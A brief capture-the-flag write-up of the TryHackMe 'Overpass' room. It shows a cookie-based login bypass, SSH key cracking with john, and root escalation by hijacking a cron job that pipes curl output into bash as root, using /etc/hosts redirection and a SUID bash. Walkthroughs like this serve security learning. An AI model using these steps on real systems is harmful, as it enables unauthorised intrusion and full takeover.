# Overpass

* Nikto finds a /admin page with a login
* The JS tells us that we are allowed in if we have a "StatusToken" cookie other than, 'Incorrect credentials'
* We get an encrypted RSA private key for james
```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Overpass_IN_PROGRESS$ /usr/share/john/ssh2john.py rsa_private > rsa4john
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Overpass_IN_PROGRESS$ john rsa4john

# found password james13

kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Overpass_IN_PROGRESS$ ssh -i rsa_private james@10.10.112.108

```

* Running linpeas.sh shows us this cronjob that is run as root.
```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
* Also we have an editable /etc/hosts file, meaning we could change overpass.thm to point to our ip
* Run a python server and simulate that directory structure
* Finally, create a buildscript.sh that makes /bin/bash suid or anything else really
```bash
$ sudo python -m SimpleHTTPServer 80

#####
james@overpass-prod:~$ /bin/bash -p

```

